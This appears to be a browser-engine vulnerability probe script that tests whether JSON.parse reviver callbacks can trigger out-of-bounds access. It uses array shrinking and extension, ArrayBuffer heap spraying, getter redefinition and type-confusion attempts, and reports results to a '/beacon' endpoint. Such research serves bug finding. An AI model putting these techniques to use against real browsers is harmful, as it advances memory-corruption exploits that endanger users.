// p423: JSON.parse reviver array mutation probe
// Test if reviver callback can cause OOB access by mutating array length
// during parsing when arrayLength is cached
(function() {
    var R = '';
    function log(s) { R += s + '\n'; }
    function send(tag, data) {
        var x = new XMLHttpRequest();
        x.open('GET', '/beacon?tag=' + tag + '&data=' + encodeURIComponent(data), false);
        x.send();
    }

    try {
        log('=== V423: JSON.parse Reviver Mutation Tests ===');

        // Test A: Array shrinking during reviver
        log('\n--- Test A: Array shrink in reviver ---');
        var callCount = 0;
        var seenIndices = [];
        var jsonStr = JSON.stringify([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]);

        var resultA = JSON.parse(jsonStr, function(key, value) {
            callCount++;
            seenIndices.push(key);
            // When processing index "2", shrink the array by deleting elements
            if (key === '2' && Array.isArray(this)) {
                this.length = 4;
                log('A: shrunk array to length 4 at key=' + key);
            }
            return value;
        });
        log('A: callCount=' + callCount + ' resultLen=' + resultA.length);
        log('A: seenIndices=' + seenIndices.join(','));
        log('A: result=' + JSON.stringify(resultA));

        // Test B: Array element deletion in reviver
        log('\n--- Test B: Element deletion in reviver ---');
        callCount = 0;
        seenIndices = [];
        var resultB = JSON.parse(jsonStr, function(key, value) {
            callCount++;
            seenIndices.push(key);
            if (key === '3') {
                delete this['5'];
                delete this['6'];
                delete this['7'];
                log('B: deleted indices 5,6,7 at key=' + key);
            }
            return value;
        });
        log('B: callCount=' + callCount + ' resultLen=' + resultB.length);
        log('B: result=' + JSON.stringify(resultB));

        // Test C: Replace array with object in reviver
        log('\n--- Test C: Object conversion in reviver ---');
        callCount = 0;
        var resultC = JSON.parse('{"a":[1,2,3,4,5,6,7,8],"b":"test"}', function(key, value) {
            callCount++;
            if (key === '0' && Array.isArray(this)) {
                // Try to mess with the array being processed
                for (var i = this.length; i < 1000; i++) {
                    this[i] = 0x41414141;
                }
                log('C: extended array to 1000 at key=' + key + ' this.length=' + this.length);
            }
            return value;
        });
        log('C: callCount=' + callCount);
        log('C: result.a.length=' + resultC.a.length);

        // Test D: Large array with reviver that allocates heavily
        log('\n--- Test D: Large array + heap spray in reviver ---');
        var largeArr = [];
        for (var i = 0; i < 256; i++) largeArr.push(i);
        var largeJson = JSON.stringify(largeArr);

        var sprayBuffers = [];
        callCount = 0;
        var resultD = JSON.parse(largeJson, function(key, value) {
            callCount++;
            if (callCount === 64) {
                // Spray ArrayBuffers during reviver
                for (var j = 0; j < 100; j++) {
                    var ab = new ArrayBuffer(256);
                    var view = new Uint8Array(ab);
                    for (var k = 0; k < 256; k++) view[k] = 0xCC;
                    sprayBuffers.push(ab);
                }
                log('D: sprayed 100 ABs at callCount=64');
            }
            return value;
        });
        log('D: callCount=' + callCount + ' resultLen=' + resultD.length);
        var ccCount = 0;
        for (var i = 0; i < resultD.length; i++) {
            if (resultD[i] === 0xCC) ccCount++;
        }
        log('D: 0xCC values in result=' + ccCount);

        // Test E: Nested object with prototype pollution in reviver
        log('\n--- Test E: __proto__ in reviver ---');
        try {
            var resultE = JSON.parse('{"a":1,"b":2,"c":3}', function(key, value) {
                if (key === 'a') {
                    Object.defineProperty(this, 'b', {
                        get: function() {
                            log('E: getter for b called');
                            return 999;
                        }
                    });
                }
                return value;
            });
            log('E: result=' + JSON.stringify(resultE));
        } catch(e) {
            log('E: error=' + e.message);
        }

        // Test F: Type confusion attempt - return different types from reviver
        log('\n--- Test F: Type confusion via reviver ---');
        var resultF = JSON.parse('[1,2,3,4,5,6,7,8]', function(key, value) {
            if (key !== '' && typeof value === 'number') {
                // Return an object instead of a number
                if (parseInt(key) === 3) {
                    var ab = new ArrayBuffer(8);
                    var f64 = new Float64Array(ab);
                    f64[0] = 1.1;
                    return f64;
                }
            }
            return value;
        });
        log('F: types=');
        for (var i = 0; i < resultF.length; i++) {
            log('  [' + i + '] ' + typeof resultF[i] + ' = ' + resultF[i]);
        }

        send('V423', R);
        log('\nSent.');
    } catch(e) {
        log('FATAL: ' + e.message);
        send('V423-ERR', R + '\nFATAL: ' + e.message);
    }
})();
